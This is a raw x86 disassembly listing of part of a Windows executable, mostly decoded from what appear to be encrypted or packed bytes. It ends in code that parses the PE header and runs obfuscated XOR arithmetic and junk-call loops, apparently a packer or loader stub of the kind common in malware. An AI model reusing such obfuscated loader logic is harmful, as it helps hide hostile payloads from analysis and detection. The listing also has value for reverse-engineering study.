  417899:	and    DWORD PTR [ebx+edx*8-0x3a],ebx
  41789d:	lock sahf 
  41789f:	adc    eax,0x3eb2406f
  4178a4:	sub    eax,0xd86be9fe
  4178a9:	repz in al,0xf0
  4178ac:	dec    eax
  4178ad:	inc    edx
  4178ae:	sbb    eax,0x5a8a08c7
  4178b3:	jl     0x4178c3
  4178b5:	mov    cl,0xc9
  4178b7:	test   BYTE PTR [eax+0x1c24788b],al
  4178bd:	sbb    ebp,DWORD PTR [ecx-0x40]
  4178c0:	into   
  4178c1:	aas    
  4178c2:	add    dl,ch
  4178c4:	fbstp  TBYTE PTR [eax+0x4bb8da99]
  4178ca:	(bad)  
  4178cb:	cmc    
  4178cc:	lods   eax,DWORD PTR ds:[esi]
  4178cd:	bound  ebp,QWORD PTR [ebx+0xe]
  4178d0:	sbb    BYTE PTR [edx-0x48],al
  4178d3:	out    dx,eax
  4178d4:	ins    DWORD PTR es:[edi],dx
  4178d5:	mov    al,ds:0x4ac6792a
  4178da:	fisttp DWORD PTR [edx]
  4178dc:	pusha  
  4178dd:	rol    DWORD PTR [ebp-0x24c05930],0xe4
  4178e4:	push   eax
  4178e5:	adc    DWORD PTR [esi-0x7d9b4e9b],ebx
  4178eb:	call   0x237c0d31
  4178f0:	adc    eax,0x37c9249d
  4178f5:	repz cmp al,0x52
  4178f8:	pushf  
  4178f9:	jnp    0x41792e
  4178fb:	inc    edi
  4178fc:	pop    ebx
  4178fd:	pop    ds
  4178fe:	push   0xffffff91
  417900:	mov    bl,0xc0
  417902:	sub    DWORD PTR [eax+0x31],eax
  417905:	aam    0x7d
  417907:	xchg   esp,eax
  417908:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417909:	sti    
  41790a:	je     0x417975
  41790c:	and    al,0x62
  41790e:	xchg   ebp,eax
  41790f:	sti    
  417910:	enter  0xea0a,0x30
  417914:	daa    
  417915:	fld    DWORD PTR [edx+esi*2]
  417918:	ror    BYTE PTR [ebx],cl
  41791a:	jg     0x41795e
  41791c:	mov    edi,0x949e2686
  417921:	xchg   BYTE PTR [edi-0x6b],al
  417924:	lods   eax,DWORD PTR ds:[esi]
  417925:	push   0x2dcf7392
  41792a:	jne    0x417924
  41792c:	or     DWORD PTR [ecx-0x21a8afdd],edx
  417932:	mov    BYTE PTR [esi+0x42],0x3f
  417936:	outs   dx,DWORD PTR ds:[esi]
  417937:	rcr    BYTE PTR [ebx+0x7f],1
  41793a:	jbe    0x41795e
  41793c:	jmp    0xa996c5de
  417941:	test   BYTE PTR [edi+edi*2-0x1be13980],0x65
  417949:	stc    
  41794a:	mov    WORD PTR [ebx-0x48],ss
  41794d:	mov    ebx,0x805ee9a3
  417952:	or     BYTE PTR [edi],ah
  417954:	pop    esi
  417955:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417956:	call   0x8ea4:0xafa322
  41795d:	pop    edi
  41795e:	test   al,0x86
  417960:	mov    eax,ds:0xf314b309
  417965:	inc    edx
  417966:	mov    edx,0x9f163335
  41796b:	je     0x417964
  41796d:	rol    BYTE PTR [esi+0x26d1a865],cl
  417973:	out    dx,eax
  417974:	cmp    eax,0x26532244
  417979:	repnz mov esp,0xd463e5b6
  41797f:	pop    es
  417980:	cmp    ah,BYTE PTR [esi-0x1691bbe5]
  417986:	and    BYTE PTR [edx-0x55e04b3d],cl
  41798c:	sbb    al,0x22
  41798e:	or     eax,0x9498ba4c
  417993:	std    
  417994:	or     al,0x96
  417996:	mov    BYTE PTR [ecx+eax*8+0x102711d8],0xe4
  41799e:	repnz aaa 
  4179a0:	pop    ds
  4179a1:	jp     0x41792d
  4179a3:	mov    DWORD PTR [bp+si+0x4d4f],ebx
  4179a8:	std    
  4179a9:	sub    DWORD PTR [edi],edx
  4179ab:	mov    dl,0xe
  4179ad:	sub    ebx,ebx
  4179af:	aas    
  4179b0:	xor    esp,DWORD PTR [ecx]
  4179b2:	(bad)  
  4179b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179b5:	pop    ebx
  4179b6:	dec    esp
  4179b7:	loope  0x41794f
  4179b9:	test   eax,0xeaee2771
  4179be:	imul   edx,DWORD PTR [esi+0x70d4d155],0x45
  4179c5:	and    eax,0x2f9e12e3
  4179ca:	loope  0x417974
  4179cc:	imul   edi,DWORD PTR ds:0x61325235,0xffffffbc
  4179d3:	sbb    BYTE PTR [edi+0x6afa9320],bh
  4179d9:	fild   WORD PTR [ecx+eax*4+0x61e0e781]
  4179e0:	add    DWORD PTR [edx+0x2073497c],eax
  4179e6:	sub    ah,BYTE PTR [ebx-0x20]
  4179e9:	dec    esp
  4179ea:	pop    ebp
  4179eb:	(bad)  
  4179ec:	scas   al,BYTE PTR es:[edi]
  4179ed:	or     ecx,DWORD PTR [edx+0x3c]
  4179f0:	adc    ecx,DWORD PTR [ecx+esi*4+0x6e22742c]
  4179f7:	test   DWORD PTR [edi],0x3da6381
  4179fd:	add    al,0x8e
  4179ff:	xchg   esp,eax
  417a00:	pop    ebp
  417a01:	cwde   
  417a02:	fidiv  WORD PTR [ebx+ebx*8]
  417a05:	nop
  417a06:	fwait
  417a07:	or     BYTE PTR [eax],bh
  417a09:	dec    eax
  417a0a:	sbb    cl,BYTE PTR [ebx-0x60]
  417a0d:	push   dx
  417a0f:	cmp    DWORD PTR [esi+0x28],eax
  417a12:	cvtps2pd xmm7,QWORD PTR [eax]
  417a15:	mov    esi,ebp
  417a17:	mov    ds:0x19cd5cde,al
  417a1c:	xchg   edx,eax
  417a1d:	or     al,BYTE PTR [eax-0x61]
  417a20:	js     0x417a76
  417a22:	mov    ecx,0x8e374a75
  417a27:	add    eax,0xbf0e7d60
  417a2c:	jno    0x417a9e
  417a2e:	sub    al,0x97
  417a30:	call   0xb65b:0x18c0f399
  417a37:	fxch   st(0)
  417a39:	pop    esp
  417a3a:	or     eax,0xbaf1098d
  417a3f:	retf   0xdd80
  417a42:	sub    BYTE PTR [edx],0x74
  417a45:	icebp  
  417a46:	(bad)  
  417a47:	shr    BYTE PTR [edx],1
  417a49:	dec    ecx
  417a4a:	or     DWORD PTR [esi+0x62],ebp
  417a4d:	ror    dl,0x0
  417a50:	mov    eax,ds:0xaf784d3
  417a55:	xchg   edi,eax
  417a56:	jnp    0x417a9f
  417a58:	call   0x7ad75705
  417a5d:	mov    ch,0xaf
  417a5f:	mov    esi,0x5472b921
  417a64:	add    DWORD PTR [ebx+ebp*1],ebx
  417a67:	imul   esp,ecx,0xfffffff5
  417a6a:	mov    bh,0xab
  417a6c:	xor    esp,esi
  417a6e:	cmp    al,0xc5
  417a70:	mov    esi,0x1e1c8e7e
  417a75:	retf   
  417a76:	aad    0x93
  417a78:	sbb    eax,0xcd0c2007
  417a7d:	sub    al,0xd0
  417a7f:	leave  
  417a80:	call   0x1e5092ab
  417a85:	stos   DWORD PTR es:[edi],eax
  417a86:	ins    DWORD PTR es:[edi],dx
  417a87:	mov    edi,0xb210855
  417a8c:	or     BYTE PTR [esi],bh
  417a8e:	xchg   ebp,eax
  417a8f:	mov    bh,0xcf
  417a91:	pop    ecx
  417a92:	test   eax,0x6c614083
  417a97:	test   BYTE PTR [edi-0xe70a30f],0x45
  417a9e:	inc    esi
  417a9f:	enter  0x84e4,0xdf
  417aa3:	dec    ecx
  417aa4:	mov    ebp,0xf7e8debb
  417aa9:	cmp    al,0xfb
  417aab:	stc    
  417aac:	and    BYTE PTR [ecx],dh
  417aae:	dec    ecx
  417aaf:	dec    ebp
  417ab0:	cmp    ah,BYTE PTR [edi+eax*8+0x8dd2546]
  417ab7:	or     al,0xcd
  417ab9:	rcr    BYTE PTR [ebp-0x57],cl
  417abc:	into   
  417abd:	test   DWORD PTR [esi+0x1a8b4a74],esi
  417ac3:	push   0xffffffb3
  417ac5:	and    DWORD PTR [eax-0x7d],0xffffff9b
  417ac9:	call   0xceec5f3a
  417ace:	inc    edx
  417acf:	addr16 pop edx
  417ad1:	ret    0xfe63
  417ad4:	adc    ch,BYTE PTR [esp+eiz*8+0x37691cf3]
  417adb:	mov    ch,dl
  417add:	jmp    0x91ceab58
  417ae2:	xchg   DWORD PTR [ecx+0x57],ecx
  417ae5:	xchg   esi,eax
  417ae6:	adc    al,BYTE PTR [ebp+0x13]
  417ae9:	out    dx,al
  417aea:	and    cl,BYTE PTR [eax+0x38]
  417aed:	out    dx,eax
  417aee:	mov    bl,0xa6
  417af0:	push   ds
  417af1:	adc    eax,0xa4a102cf
  417af6:	arpl   cx,cx
  417af8:	shl    DWORD PTR [edx+edx*2+0x36],1
  417afc:	aad    0x21
  417afe:	ficomp DWORD PTR [esi-0x4c]
  417b01:	add    al,0x46
  417b03:	jmp    0x4826:0xcc72086a
  417b0a:	pop    edi
  417b0b:	sub    DWORD PTR [ebp-0xcdd01],esp
  417b11:	inc    BYTE PTR [eax+0x4fb42184]
  417b17:	ss or  al,0x5a
  417b1a:	mov    WORD PTR [eax],es
  417b1c:	mov    ebp,0xfc9afd7b
  417b21:	scas   al,BYTE PTR es:[edi]
  417b22:	fstp   TBYTE PTR [ebp-0x359f43d7]
  417b28:	in     eax,0x11
  417b2a:	fld    TBYTE PTR [edx+0x4e]
  417b2d:	push   ebp
  417b2e:	inc    edi
  417b2f:	xchg   edi,eax
  417b30:	mov    cl,0xc9
  417b32:	cmp    ch,BYTE PTR [ecx+0x44]
  417b35:	cdq    
  417b36:	sub    cl,BYTE PTR [ebp+0x76e5591b]
  417b3c:	xor    eax,0xffffff93
  417b3f:	xor    cl,BYTE PTR [ebp+0x798a6295]
  417b45:	ds pop ebx
  417b47:	xor    eax,0xe1660025
  417b4c:	mov    cl,0x2c
  417b4e:	(bad)  
  417b4f:	xor    eax,0xd5465a93
  417b54:	lahf   
  417b55:	jno    0x417afb
  417b57:	cwde   
  417b58:	sbb    BYTE PTR [ebp+edi*8-0x2b],al
  417b5c:	mov    bh,0x9d
  417b5e:	clc    
  417b5f:	mov    al,ds:0x6c276128
  417b64:	sbb    al,0x62
  417b66:	in     al,dx
  417b67:	pop    ds
  417b68:	ja     0x417bda
  417b6a:	mov    ah,0x14
  417b6c:	xchg   dl,ah
  417b6e:	dec    esi
  417b6f:	les    esp,FWORD PTR [ecx]
  417b71:	std    
  417b72:	mov    eax,0x7f97a604
  417b77:	mov    cs,WORD PTR [eax]
  417b79:	repnz pop ss
  417b7b:	mov    dh,BYTE PTR [edx]
  417b7d:	ins    DWORD PTR es:[edi],dx
  417b7e:	jge    0x417be3
  417b80:	sub    al,0x62
  417b82:	fistp  QWORD PTR [ebp+0x4f]
  417b85:	outs   dx,BYTE PTR ds:[esi]
  417b86:	sbb    BYTE PTR [ecx-0x6d7606ec],dh
  417b8c:	loopne 0x417bd5
  417b8e:	adc    edx,DWORD PTR [edx]
  417b90:	int    0x91
  417b92:	adc    BYTE PTR [esi-0x14],dh
  417b95:	(bad)  
  417b96:	sub    ebx,ecx
  417b98:	sbb    edi,esp
  417b9a:	clc    
  417b9b:	jb     0x417c00
  417b9d:	xlat   BYTE PTR ds:[ebx]
  417b9e:	ss int3 
  417ba0:	mov    al,0x44
  417ba2:	inc    eax
  417ba3:	cdq    
  417ba4:	dec    esp
  417ba5:	stos   DWORD PTR es:[edi],eax
  417ba6:	mov    WORD PTR [ecx-0x23],cs
  417ba9:	outs   dx,BYTE PTR ds:[esi]
  417baa:	inc    ecx
  417bab:	std    
  417bac:	scas   eax,DWORD PTR es:[edi]
  417bad:	dec    edx
  417bae:	test   DWORD PTR [ecx],ebp
  417bb0:	mov    dl,0x64
  417bb2:	mov    ds:0x9c976510,eax
  417bb7:	(bad)  
  417bb8:	test   eax,0xfbbf11d6
  417bbd:	jo     0x417bb5
  417bbf:	add    al,0xf3
  417bc1:	pop    esi
  417bc2:	jae    0x417b45
  417bc4:	lods   eax,DWORD PTR ds:[esi]
  417bc5:	add    DWORD PTR [ecx],edi
  417bc7:	xchg   eax,esp
  417bc9:	std    
  417bca:	jo     0x417b9b
  417bcc:	out    0xa0,eax
  417bce:	xor    BYTE PTR [edi-0x3793a923],al
  417bd4:	add    eax,0xa9f72e13
  417bd9:	stos   BYTE PTR es:[edi],al
  417bda:	xor    eax,DWORD PTR ds:0xd9c5d77
  417be0:	pop    edi
  417be1:	pop    edi
  417be2:	mov    ds:0xd48f2339,al
  417be7:	or     ecx,DWORD PTR [esi-0xc]
  417bea:	sbb    BYTE PTR [esi],0xd7
  417bed:	call   0xba0a5258
  417bf2:	inc    ecx
  417bf3:	mov    dh,0xdf
  417bf5:	xlat   BYTE PTR ds:[ebx]
  417bf6:	(bad)  
  417bf7:	test   al,0x8f
  417bf9:	hlt    
  417bfa:	bswap  esp
  417bfc:	sub    BYTE PTR [ebx+0x2f999c39],cl
  417c02:	jno    0x417bf7
  417c04:	rol    DWORD PTR [edx+ebp*8],0xf1
  417c08:	fidiv  DWORD PTR [ebx+ecx*8]
  417c0b:	mov    DWORD PTR [edi+0x61],edi
  417c0e:	fs or  eax,0x97471aac
  417c14:	test   eax,0x17bc4c82
  417c19:	cld    
  417c1a:	jle    0x417bdb
  417c1c:	scas   al,BYTE PTR es:[edi]
  417c1d:	lock adc ecx,DWORD PTR [edi+0x43dd9913]
  417c24:	dec    ebp
  417c25:	mov    ecx,db1
  417c28:	in     eax,0x2b
  417c2a:	push   es
  417c2b:	shr    DWORD PTR [ebx+0x7dffa2da],0x61
  417c32:	out    0xfd,al
  417c34:	std    
  417c35:	push   edx
  417c36:	ja     0x417c6d
  417c38:	adc    cl,BYTE PTR [edi]
  417c3a:	je     0x417c2b
  417c3c:	push   ss
  417c3d:	adc    eax,0xd506a38c
  417c42:	mov    ah,0x91
  417c44:	test   eax,0x6b78b0d6
  417c49:	inc    ebp
  417c4a:	mov    ebx,0xbf88b4fa
  417c4f:	or     BYTE PTR [edi],ch
  417c51:	sub    dl,bl
  417c53:	sub    eax,0x26e7fbf1
  417c58:	sub    al,0x81
  417c5a:	pop    edx
  417c5b:	or     DWORD PTR [edi],esp
  417c5d:	call   0xe86613d3
  417c62:	mov    ebp,0x5b3fc3fa
  417c67:	dec    ebx
  417c68:	add    DWORD PTR [edx+0x21c5300e],0x9
  417c6f:	imul   ecx,DWORD PTR [edi+0x34],0x771cd3c
  417c76:	das    
  417c77:	test   bl,ah
  417c79:	test   BYTE PTR [edi+0x6c],ch
  417c7c:	call   0x4c14:0x609cfd0
  417c83:	add    al,0xc5
  417c85:	jne    0x417cad
  417c87:	mov    cl,0xc3
  417c89:	xchg   edx,eax
  417c8a:	inc    edx
  417c8b:	jg     0x417c74
  417c8d:	push   ebp
  417c8e:	call   0xd0b1e4f0
  417c93:	ret    0x300f
  417c96:	push   esi
  417c97:	mov    WORD PTR ds:0x1c91ba8c,ss
  417c9d:	push   edx
  417c9e:	dec    ebx
  417c9f:	or     BYTE PTR [edi+0x32],bh
  417ca2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ca3:	jmp    0x417c49
  417ca5:	add    BYTE PTR [esi+0x13],dl
  417ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ca9:	(bad)  
  417caa:	idiv   BYTE PTR [edx-0x29]
  417cad:	jl     0x417cb9
  417caf:	neg    dh
  417cb1:	jge    0x417c6d
  417cb3:	mov    al,0x35
  417cb5:	jg     0x417d28
  417cb7:	dec    esp
  417cb8:	repnz sub DWORD PTR [esi],ebx
  417cbb:	push   esi
  417cbc:	sbb    DWORD PTR [eax+0x7b243235],esp
  417cc2:	fcmovnu st,st(4)
  417cc4:	shl    BYTE PTR [ebp+0x31],cl
  417cc7:	int    0x9
  417cc9:	adc    BYTE PTR [esi-0x1],ah
  417ccc:	or     ah,BYTE PTR [edx]
  417cce:	repz inc edi
  417cd0:	loop   0x417cec
  417cd2:	icebp  
  417cd3:	lock pop edx
  417cd5:	(bad)  
  417cd6:	and    DWORD PTR [ebx+0x73],ebx
  417cd9:	xchg   edx,eax
  417cda:	sar    dh,cl
  417cdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cdd:	sar    BYTE PTR [edi+ecx*8+0x12],1
  417ce1:	xor    BYTE PTR ds:0x20f69527,0xdf
  417ce8:	gs nop
  417cea:	mov    DWORD PTR [esi-0x28a2f587],ecx
  417cf0:	mov    esi,0x699d39b
  417cf5:	mov    bh,0x9e
  417cf7:	ins    DWORD PTR es:[edi],dx
  417cf8:	ret    
  417cf9:	mov    ebp,0x6d32c2ab
  417cfe:	and    ch,ah
  417d00:	in     eax,0x67
  417d02:	repnz inc ebx
  417d04:	mov    ds:0x54329767,eax
  417d09:	test   esp,edi
  417d0b:	dec    eax
  417d0c:	pushf  
  417d0d:	mov    ds:0x8608921d,eax
  417d12:	ins    BYTE PTR es:[edi],dx
  417d13:	(bad)  
  417d14:	imul   ebp,DWORD PTR [edx+0x2e1484a2],0x60d85f47
  417d1e:	retf   0xca3d
  417d21:	dec    edx
  417d22:	dec    ebx
  417d23:	outs   dx,BYTE PTR ds:[esi]
  417d24:	sub    BYTE PTR [esi],al
  417d26:	cld    
  417d27:	pop    ebp
  417d28:	jnp    0x417d94
  417d2a:	out    dx,eax
  417d2b:	mov    ah,0x6
  417d2d:	mov    ds:0xd213d368,eax
  417d32:	dec    edi
  417d33:	jne    0x417d0f
  417d35:	dec    eax
  417d36:	inc    edx
  417d37:	push   0x6bb8e903
  417d3c:	sub    DWORD PTR [edx],0x845ab173
  417d42:	fsubr  DWORD PTR [ecx+0x29]
  417d45:	pop    ds
  417d46:	sbb    BYTE PTR [ebp-0x2a],cl
  417d49:	pop    esp
  417d4a:	jnp    0x417d88
  417d4c:	jecxz  0x417d1d
  417d4e:	das    
  417d4f:	cwde   
  417d50:	out    dx,al
  417d51:	inc    DWORD PTR [ebx+0x126f6de5]
  417d57:	add    ebx,ebp
  417d59:	sahf   
  417d5a:	xor    DWORD PTR [ebp+0x3e3f03e4],esp
  417d60:	or     edx,DWORD PTR [edx-0x76]
  417d63:	adc    al,0x43
  417d65:	les    esi,FWORD PTR [ebx+ebx*1+0x40]
  417d69:	mov    eax,0xcf944be9
  417d6e:	inc    edi
  417d6f:	and    dl,BYTE PTR [esi]
  417d71:	mov    DWORD PTR [edi-0x21],edx
  417d74:	adc    ah,bh
  417d76:	lahf   
  417d77:	or     BYTE PTR [esi-0x26],dl
  417d7a:	dec    edi
  417d7b:	pop    eax
  417d7c:	cld    
  417d7d:	sbb    ecx,DWORD PTR [esi-0x104a9476]
  417d83:	and    bl,BYTE PTR [eax]
  417d85:	xchg   DWORD PTR [edi+0x6714d72b],ebx
  417d8b:	fimul  DWORD PTR [eax*1-0x7b1f5938]
  417d92:	dec    ebp
  417d93:	pop    ebx
  417d94:	clc    
  417d95:	bound  edi,QWORD PTR [ebx+0x7998c620]
  417d9b:	leave  
  417d9c:	std    
  417d9d:	adc    edi,DWORD PTR [esi+eax*2+0x71]
  417da1:	jg     0x417dd6
  417da3:	ja     0x417d9e
  417da5:	pop    ebp
  417da6:	cmp    BYTE PTR [ebx-0x1047eed2],dh
  417dac:	test   DWORD PTR [edi],edx
  417dae:	and    edi,esp
  417db0:	sub    ebx,DWORD PTR [edi+0x2]
  417db3:	push   ds
  417db4:	sbb    edi,eax
  417db6:	mov    al,0x5e
  417db8:	outs   dx,BYTE PTR ds:[esi]
  417db9:	fisub  WORD PTR [ecx+0x7430bc13]
  417dbf:	fadd   QWORD PTR ds:0x138bb7e4
  417dc5:	xchg   edx,eax
  417dc6:	xchg   edx,eax
  417dc7:	xor    ecx,eax
  417dc9:	sbb    al,0xce
  417dcb:	rcl    BYTE PTR [ebx+0x79],1
  417dce:	cmp    BYTE PTR [esi+0x19],ch
  417dd1:	pusha  
  417dd2:	xor    al,0x9b
  417dd4:	inc    esi
  417dd5:	dec    edi
  417dd6:	sbb    eax,0x7c3a5ad8
  417ddb:	push   ebx
  417ddc:	push   ebx
  417ddd:	adc    DWORD PTR [edx+0x4e],esp
  417de0:	sub    al,0x9c
  417de2:	fist   DWORD PTR [ecx+ebp*1+0x22]
  417de6:	jne    0x417d89
  417de8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417de9:	xchg   ebp,eax
  417dea:	xor    eax,0x82525692
  417def:	(bad)  
  417df0:	dec    ecx
  417df1:	xchg   esp,eax
  417df2:	and    eax,0xc40c90a0
  417df7:	in     al,0xa3
  417df9:	mov    edi,es
  417dfb:	lods   eax,DWORD PTR ds:[esi]
  417dfc:	inc    eax
  417dfd:	jmp    0x417e7a
  417dff:	fbstp  TBYTE PTR [esp+esi*2]
  417e02:	mov    ebp,0x45442991
  417e07:	stc    
  417e08:	leave  
  417e09:	push   ebp
  417e0a:	cmp    al,0x27
  417e0c:	jmp    DWORD PTR [esi+0x1eaacd5d]
  417e12:	dec    ebp
  417e13:	sbb    DWORD PTR [edi],ecx
  417e15:	mov    ah,BYTE PTR [eax]
  417e17:	jno    0x417df7
  417e19:	mov    edx,0xaeb511b
  417e1e:	call   0x759:0xa1d4f36c
  417e25:	aam    0x9
  417e27:	in     eax,0xc1
  417e29:	out    0x63,eax
  417e2b:	ret    0xb527
  417e2e:	adc    dh,bh
  417e30:	lock lods eax,DWORD PTR ds:[esi]
  417e33:	in     eax,dx
  417e34:	and    eax,0xecce8270
  417e39:	xor    BYTE PTR [edx-0x9101676],cl
  417e3f:	shr    BYTE PTR [edx+ecx*4-0x4b904ac4],0xb3
  417e47:	jmp    0xa18e52f4
  417e4c:	dec    eax
  417e4d:	sub    al,0x56
  417e4f:	mov    edx,0x38c05b96
  417e54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e55:	cmp    BYTE PTR [ebx],0x23
  417e58:	nop
  417e59:	fistp  DWORD PTR [edi-0x49c68e1c]
  417e5f:	rol    DWORD PTR [esi],0x8
  417e62:	lods   al,BYTE PTR ds:[esi]
  417e63:	add    al,0x6c
  417e65:	pop    eax
  417e66:	jb     0x417ee3
  417e68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e69:	mov    al,0x2d
  417e6b:	nop
  417e6c:	cmp    al,0x8f
  417e6e:	mov    bl,0x16
  417e70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e71:	sub    al,0x85
  417e73:	out    0xef,al
  417e75:	not    bl
  417e77:	cmp    eax,0x897a4567
  417e7c:	jmp    0x5a52:0xc69e5e2a
  417e83:	in     eax,0x1d
  417e85:	mov    esi,0x631a5272
  417e8a:	lods   eax,DWORD PTR ds:[esi]
  417e8b:	mov    esp,0x20c16054
  417e90:	xchg   DWORD PTR [ebp+0x38531dab],ebp
  417e96:	push   ebx
  417e97:	inc    ecx
  417e98:	in     al,dx
  417e99:	pushf  
  417e9a:	sbb    eax,0x7f5e8999
  417e9f:	imul   ebp,DWORD PTR [ecx+0x1bb47b1c],0x6f
  417ea6:	inc    esp
  417ea7:	je     0x417e37
  417ea9:	fnstcw WORD PTR [eax-0x22cb52c7]
  417eaf:	lds    ebp,FWORD PTR [esi+0x17]
  417eb2:	nop
  417eb3:	cmc    
  417eb4:	test   DWORD PTR [edx+0x57a252b3],esi
  417eba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ebb:	enter  0x33fe,0x36
  417ebf:	mov    fs,WORD PTR [eax+0x5ebbcd88]
  417ec5:	arpl   cx,bx
  417ec7:	sbb    al,0x10
  417ec9:	sti    
  417eca:	sub    al,0xab
  417ecc:	add    al,0x4d
  417ece:	inc    ebp
  417ecf:	aas    
  417ed0:	ja     0x417f21
  417ed2:	nop
  417ed3:	mov    dl,0x1c
  417ed5:	outs   dx,DWORD PTR ds:[esi]
  417ed7:	pop    ecx
  417ed8:	lea    eax,[esi-0x40938ab5]
  417ede:	(bad)  
  417edf:	icebp  
  417ee0:	scas   eax,DWORD PTR es:[edi]
  417ee1:	and    edi,DWORD PTR [ecx]
  417ee3:	sbb    BYTE PTR [ebx+0x41],bl
  417ee6:	std    
  417ee7:	sti    
  417ee8:	add    al,0x68
  417eea:	and    edi,0x63
  417eed:	in     al,dx
  417eee:	out    0x64,al
  417ef0:	xchg   esi,eax
  417ef1:	in     eax,0x97
  417ef3:	xor    DWORD PTR [esp+esi*4],0x3
  417ef7:	mov    edi,0xcf47f9d0
  417efc:	mov    bl,0xf9
  417efe:	fmul   DWORD PTR [edx-0x36b9b843]
  417f04:	xchg   ecx,eax
  417f05:	cwde   
  417f06:	or     eax,0x6b135f64
  417f0b:	fwait
  417f0c:	xchg   ebp,eax
  417f0d:	push   es
  417f0e:	push   es
  417f0f:	xchg   ecx,eax
  417f10:	mov    edi,0x967aaac8
  417f15:	out    0x36,eax
  417f17:	jnp    0x417f48
  417f19:	inc    edi
  417f1a:	xchg   esi,eax
  417f1b:	jle    0x417f8b
  417f1d:	adc    eax,0x65d4adac
  417f22:	mov    eax,0x81008aee
  417f27:	add    eax,0x429004
  417f2c:	dec    esi
  417f2d:	and    al,0x0
  417f2f:	add    BYTE PTR [ecx*1-0x6febca7f],al
  417f36:	inc    edx
  417f37:	add    BYTE PTR [eax+eiz*2],cl
  417f3a:	inc    edx
  417f3b:	add    BYTE PTR [edi+ebp*2],dh
  417f3e:	mov    DWORD PTR ds:0x427010,0x5834
  417f48:	cmp    al,0x35
  417f4a:	jne    0x417f8f
  417f50:	mov    eax,DWORD PTR [ebp+0x8]
  417f53:	mov    ecx,DWORD PTR [ebp+0x8]
  417f56:	add    ecx,DWORD PTR [eax+0x3c]
  417f59:	mov    edx,0x7510893
  417f5e:	mov    DWORD PTR [ebp+0x8],ecx
  417f61:	mov    eax,DWORD PTR [ebp-0x4]
  417f64:	xor    eax,edx
  417f66:	push   esi
  417f67:	mov    esi,DWORD PTR [ebp+0x8]
  417f6a:	mov    ecx,0x3272db
  417f6f:	add    eax,ecx
  417f71:	cmp    DWORD PTR [esi+0x54],eax
  417f74:	pop    esi
  417f75:	je     0x417f83
  417f7b:	mov    eax,DWORD PTR [ebp+0x8]
  417f7e:	jmp    0x417f9c
  417f83:	mov    eax,DWORD PTR [ebp-0x4]
  417f86:	xor    eax,edx
  417f88:	add    eax,ecx
  417f8a:	jmp    0x417f9c
  417f8f:	mov    eax,DWORD PTR [ebp-0x4]
  417f92:	xor    eax,0x7510893
  417f97:	add    eax,0x3272db
  417f9c:	leave  
  417f9d:	ret    0x4
  417fa0:	push   ebp
  417fa1:	mov    ebp,esp
  417fa3:	push   ecx
  417fa4:	push   ecx
  417fa5:	mov    DWORD PTR ds:0x425024,0x14
  417faf:	cmp    DWORD PTR ds:0x425024,0x0
  417fb6:	je     0x417ff0
  417fbc:	cmp    DWORD PTR ds:0x425024,0x1c
  417fc3:	jne    0x417fdc
  417fc9:	push   DWORD PTR [ebp-0xc]
  417fcc:	push   0x427000
  417fd1:	push   0x4617
  417fd6:	call   DWORD PTR ds:0x421034
  417fdc:	xor    edx,edx
  417fde:	add    edx,DWORD PTR ds:0x425024
  417fe4:	dec    edx
  417fe5:	mov    DWORD PTR ds:0x425024,edx
  417feb:	jmp    0x417faf
  417ff0:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  417ff7:	mov    DWORD PTR ds:0x428010,0x1b
  418001:	cmp    DWORD PTR ds:0x428010,0x0
  418008:	je     0x41803b
  41800e:	cmp    DWORD PTR ds:0x428010,0x20
  418015:	jne    0x418029
  41801b:	push   DWORD PTR [ebp-0x1c]
  41801e:	push   0x4a52
  418023:	call   DWORD PTR ds:0x421038
  418029:	mov    ecx,DWORD PTR ds:0x428010
  41802f:	dec    ecx
  418030:	mov    DWORD PTR ds:0x428010,ecx
  418036:	jmp    0x418001
  41803b:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  418042:	mov    eax,DWORD PTR [ebp-0x4]
  418045:	add    edx,0xdc
  41804b:	push   esi
  41804c:	mov    edx,DWORD PTR ds:0x41fffb
  418052:	xor    ecx,ecx
  418054:	add    ecx,DWORD PTR ds:0x41d25c
  41805a:	sub    ecx,edx
  41805c:	and    edx,DWORD PTR [edx+ecx*1]
  41805f:	mov    esi,DWORD PTR [ebp-0x8]
  418062:	add    DWORD PTR ds:0x429010,0x2693
  41806c:	mov    edx,0x7510893
  418071:	xor    eax,edx
  418073:	xor    esi,edx
  418075:	and    DWORD PTR ds:0x42901c,0x0
  41807f:	jmp    0x418091
  418084:	mov    ecx,DWORD PTR ds:0x42901c
  41808a:	inc    ecx
  41808b:	mov    DWORD PTR ds:0x42901c,ecx
  418091:	cmp    DWORD PTR ds:0x42901c,0x17
  418098:	jae    0x4180e3
  41809e:	cmp    DWORD PTR ds:0x42901c,0xb
  4180a5:	jne    0x4180c4
  4180ab:	push   DWORD PTR [ebp-0x10]
  4180ae:	push   0x8d74
  4180b3:	push   0x428004
  4180b8:	push   DWORD PTR [ebp-0x10]
  4180bb:	push   DWORD PTR [ebp-0x14]
  4180be:	call   DWORD PTR ds:0x421000
  4180c4:	cmp    DWORD PTR ds:0x42901c,0xa
  4180cb:	jne    0x4180de
  4180d1:	mov    ecx,DWORD PTR ds:0x42901c
  4180d7:	inc    ecx
  4180d8:	mov    DWORD PTR ds:0x42901c,ecx
  4180de:	jmp    0x418084
  4180e3:	mov    ecx,0x3272db
  4180e8:	add    esi,ecx
  4180ea:	add    eax,ecx
  4180ec:	imul   eax,esi
  4180ef:	mov    esi,DWORD PTR [ebp+0xc]
  4180f2:	cmp    esi,eax
  4180f4:	jne    0x41a4c2
  4180fa:	mov    eax,DWORD PTR [ebp-0x4]
  4180fd:	mov    esi,DWORD PTR [ebp-0x8]
  418100:	xor    eax,edx
  418102:	jmp    0x41a4b4
  418107:	mov    esp,0x2510558f
  41810c:	sub    DWORD PTR fs:[ebx-0x5f],0xffffff83
  418111:	mov    al,0xb8
